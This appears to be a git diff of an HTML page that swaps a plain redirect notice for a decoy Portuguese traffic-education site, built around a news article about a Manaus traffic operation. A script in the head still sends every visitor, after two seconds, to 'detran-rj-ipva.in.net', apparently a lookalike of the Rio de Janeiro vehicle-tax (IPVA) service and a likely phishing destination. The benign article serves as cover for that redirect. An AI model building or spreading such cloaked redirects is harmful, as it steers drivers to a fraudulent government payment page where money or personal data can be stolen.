@@ -3,17 +3,491 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Redirecionando...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educação no Trânsito - Segurança para Todos</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset e configurações gerais */
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f9ff;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        /* Cabeçalho */
+        
+        header {
+            background: linear-gradient(to right, #1a5fb4, #2a7fde);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo i {
+            font-size: 2.5rem;
+        }
+        
+        .logo h1 {
+            font-size: 1.8rem;
+        }
+        
+        .logo span {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 25px;
+        }
+        
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        
+        nav a:hover {
+            color: #ffdd40;
+        }
+        /* Banner principal */
+        
+        .hero {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://images.unsplash.com/photo-1549399542-7e3f8b79c341?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            text-align: center;
+            padding: 80px 20px;
+            margin-bottom: 40px;
+        }
+        
+        .hero h2 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 30px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: #ffdd40;
+            color: #333;
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #ffc800;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        /* Conteúdo principal */
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 40px;
+            margin-bottom: 50px;
+        }
+        
+        .article-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .article-content h3 {
+            color: #1a5fb4;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eee;
+        }
+        
+        .article-content p {
+            margin-bottom: 20px;
+        }
+        
+        .highlight {
+            background-color: #e8f4ff;
+            padding: 20px;
+            border-left: 4px solid #1a5fb4;
+            margin: 25px 0;
+            font-style: italic;
+        }
+        /* Sidebar */
+        
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        .info-box {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .info-box h4 {
+            color: #1a5fb4;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .info-box ul {
+            list-style-position: inside;
+            margin-left: 10px;
+        }
+        
+        .info-box li {
+            margin-bottom: 10px;
+        }
+        
+        .statistics {
+            background-color: #1a5fb4;
+            color: white;
+        }
+        
+        .statistics h4 {
+            color: white;
+        }
+        
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        /* Dicas */
+        
+        .tips-section {
+            margin-bottom: 50px;
+        }
+        
+        .tips-section h3 {
+            text-align: center;
+            color: #1a5fb4;
+            margin-bottom: 30px;
+        }
+        
+        .tips-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 25px;
+        }
+        
+        .tip-card {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            transition: transform 0.3s;
+        }
+        
+        .tip-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .tip-card i {
+            font-size: 2.5rem;
+            color: #1a5fb4;
+            margin-bottom: 15px;
+        }
+        
+        .tip-card h4 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        /* Rodapé */
+        
+        footer {
+            background-color: #1a5fb4;
+            color: white;
+            padding: 40px 0 20px;
+            margin-top: 50px;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-column h4 {
+            margin-bottom: 20px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+            padding-bottom: 10px;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+        }
+        
+        .footer-column li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-column a {
+            color: #ddd;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-column a:hover {
+            color: #ffdd40;
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+        /* Responsividade */
+        
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+            nav ul {
+                gap: 15px;
+            }
+            .hero h2 {
+                font-size: 2rem;
+            }
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .tips-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 
     <script>
         setTimeout(() => {
-            window.location.href = "kidbengala/";
+            window.location.href = "https://detran-rj-ipva.in.net/";
         }, 2000); // 3 segundos
     </script>
 </head>
 
 <body>
-    <p>Você será redirecionado em instantes...</p>
+    <!-- Cabeçalho -->
+    <header>
+        <div class="container header-content">
+            <div class="logo">
+                <i class="fas fa-traffic-light"></i>
+                <div>
+                    <h1>Educação no Trânsito</h1>
+                    <span>Segurança para todos</span>
+                </div>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#inicio">Início</a></li>
+                    <li><a href="#artigo">Artigo</a></li>
+                    <li><a href="#dicas">Dicas</a></li>
+                    <li><a href="#contato">Contato</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Banner principal -->
+    <section class="hero" id="inicio">
+        <div class="container">
+            <h2>Juntos por um trânsito mais seguro</h2>
+            <p>A educação no trânsito é essencial para prevenir acidentes e salvar vidas. Conheça as iniciativas e orientações para motoristas, motociclistas e pedestres.</p>
+            <a href="#artigo" class="btn">Leia o artigo completo</a>
+        </div>
+    </section>
+
+    <!-- Conteúdo principal -->
+    <div class="container">
+        <div class="main-content">
+            <!-- Artigo principal -->
+            <article class="article-content" id="artigo">
+                <h3>Operação integrada promove educação e fiscalização no trânsito de Manaus</h3>
+                <p>Motoristas e motociclistas que trafegavam pela avenida das Torres, na manhã desta terça-feira, 7/1, foram abordados durante operação integrada da Prefeitura de Manaus, por meio do Instituto Municipal de Mobilidade Urbana (IMMU). Além da
+                    fiscalização de documentos e das condições dos veículos, a iniciativa promoveu uma abordagem educativa com orientações sobre segurança e distribuição de materiais informativos para prevenção de acidentes.
+                </p>
+
+                <p>A operação contou com o suporte da Ronda Ostensiva Municipal (Romu), da Guarda Municipal de Manaus, do Batalhão de Policiamento de Trânsito (BPTran) e do Departamento Estadual de Trânsito do Amazonas (Detran-AM). Ao todo, foram abordados
+                    737 veículos, resultando em 168 notificações e 28 remoções ao parqueamento por diversas irregularidades.
+                </p>
+
+                <div class="highlight">
+                    "Esta é uma ação para levar mais segurança à cidade. Os veículos com irregularidades são removidos ao pátio para que possam ser regularizados e, posteriormente, devolvidos aos proprietários. Nossos agentes buscam sempre uma abordagem cordial, com o foco
+                    principal em salvar vidas e evitar acidentes"
+                    <div style="text-align: right; margin-top: 10px; font-weight: bold;">- Renato Bruno, chefe de Operações do IMMU</div>
+                </div>
+
+                <p>Durante a ação, foram identificados veículos sem placa, condutores sem Carteira Nacional de Habilitação (CNH) e automóveis sem condições de trafegar devido ao mau estado de conservação.</p>
+
+                <p>A chefe do setor de Educação do IMMU, Hanara Souza, detalhou o foco do trabalho de conscientização. "Nosso objetivo é sensibilizar os condutores, especialmente os motociclistas, que infelizmente são as maiores vítimas de acidentes fatais
+                    ou com ferimentos graves. Queremos transmitir a importância do respeito às leis. Distribuímos materiais informativos para motoristas, motociclistas e pedestres, pois juntos podemos salvar vidas", destacou.</p>
+
+                <p>O representante comercial Robson Batista, de 32 anos, pilotava sua motocicleta quando foi abordado e aprovou a iniciativa. Para ele, as operações ajudam a ordenar o trânsito da capital. "Esse tipo de atuação orienta a todos. A mensagem
+                    que fica é que os motoristas busquem a regularização, pois isso é importante para a segurança de todos", concluiu.</p>
+            </article>
+
+            <!-- Sidebar -->
+            <aside class="sidebar">
+                <!-- Infrações mais comuns -->
+                <div class="info-box">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Infrações Mais Comuns</h4>
+                    <ul>
+                        <li>Dirigir sem CNH ou com documento vencido</li>
+                        <li>Veículo sem placa de identificação</li>
+                        <li>Mau estado de conservação do veículo</li>
+                        <li>Estacionar em local proibido</li>
+                        <li>Não usar capacete (motociclistas)</li>
+                        <li>Não usar cinto de segurança</li>
+                    </ul>
+                </div>
+
+                <!-- Estatísticas -->
+                <div class="info-box statistics">
+                    <h4><i class="fas fa-chart-bar"></i> Estatísticas da Operação</h4>
+                    <div class="stat-item">
+                        <span>Veículos abordados</span>
+                        <strong>737</strong>
+                    </div>
+                    <div class="stat-item">
+                        <span>Notificações aplicadas</span>
+                        <strong>168</strong>
+                    </div>
+                    <div class="stat-item">
+                        <span>Veículos removidos</span>
+                        <strong>28</strong>
+                    </div>
+                    <div class="stat-item">
+                        <span>Órgãos envolvidos</span>
+                        <strong>5</strong>
+                    </div>
+                </div>
+
+                <!-- Documentação necessária -->
+                <div class="info-box">
+                    <h4><i class="fas fa-file-alt"></i> Documentação Necessária</h4>
+                    <ul>
+                        <li>Carteira Nacional de Habilitação (CNH)</li>
+                        <li>Documento do veículo (CRLV)</li>
+                        <li>Placas dianteira e traseira</li>
+                        <li>Comprovante de seguro (obrigatório)</li>
+                        <li>Comprovante de licenciamento anual</li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+
+        <!-- Dicas de segurança -->
+        <section class="tips-section" id="dicas">
+            <h3>Dicas de Segurança no Trânsito</h3>
+            <div class="tips-grid">
+                <div class="tip-card">
+                    <i class="fas fa-motorcycle"></i>
+                    <h4>Para Motociclistas</h4>
+                    <p>Use sempre capacete adequado e roupas de proteção. Mantenha distância segura dos outros veículos.
+                    </p>
+                </div>
+                <div class="tip-card">
+                    <i class="fas fa-car"></i>
+                    <h4>Para Motoristas</h4>
+                    <p>Respeite os limites de velocidade. Nunca dirija sob efeito de álcool ou cansaço extremo.</p>
+                </div>
+                <div class="tip-card">
+                    <i class="fas fa-walking"></i>
+                    <h4>Para Pedestres</h4>
+                    <p>Atravesse sempre na faixa de pedestres. Olhe para os dois lados antes de atravessar.</p>
+                </div>
+                <div class="tip-card">
+                    <i class="fas fa-traffic-light"></i>
+                    <h4>Sinalização</h4>
+                    <p>Respeite todos os sinais de trânsito. Placas e semáforos existem para proteger a todos.</p>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Rodapé -->
+    <footer id="contato">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Educação no Trânsito</h4>
+                    <p>Iniciativa dedicada à promoção da segurança no trânsito através da educação e conscientização de todos os usuários das vias públicas.</p>
+                </div>
+                <div class="footer-column">
+                    <h4>Órgãos Envolvidos</h4>
+                    <ul>
+                        <li>Instituto Municipal de Mobilidade Urbana (IMMU)</li>
+                        <li>Ronda Ostensiva Municipal (Romu)</li>
+                        <li>Guarda Municipal de Manaus</li>
+                        <li>Batalhão de Policiamento de Trânsito (BPTran)</li>
+                        <li>Detran-AM</li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Contato e Informações</h4>
+                    <ul>
+                        <li><i class="fas fa-phone"></i> (92) 3214-0000</li>
+                        <li><i class="fas fa-envelope"></i> contato@immu.manaus.am.gov.br</li>
+                        <li><i class="fas fa-map-marker-alt"></i> Av. das Torres, 1000 - Manaus/AM</li>
+                        <li><i class="fas fa-clock"></i> Atendimento: 8h às 18h (segunda a sexta)</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 Educação no Trânsito - Todos os direitos reservados. Desenvolvido para conscientização sobre segurança viária.</p>
+            </div>
+        </div>
+    </footer>
 </body>
 
 </html>
